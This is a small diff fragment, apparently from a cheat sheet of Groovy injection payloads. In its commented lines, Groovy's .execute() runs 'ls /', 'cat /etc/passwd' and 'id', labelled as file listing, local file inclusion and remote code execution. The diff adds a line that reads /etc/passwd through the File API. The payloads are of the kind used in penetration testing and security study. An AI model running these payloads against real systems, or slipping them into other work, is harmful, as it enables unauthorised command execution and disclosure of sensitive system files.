@@ -48,3 +48,5 @@ http:
 # "ls /".execute().text	#file listing
 # "cat /etc/passwd".execute().text	#lfi, passwd listing
 # "id".execute().text	#rce, current user listing
+
+# println new File("/etc/passwd").text
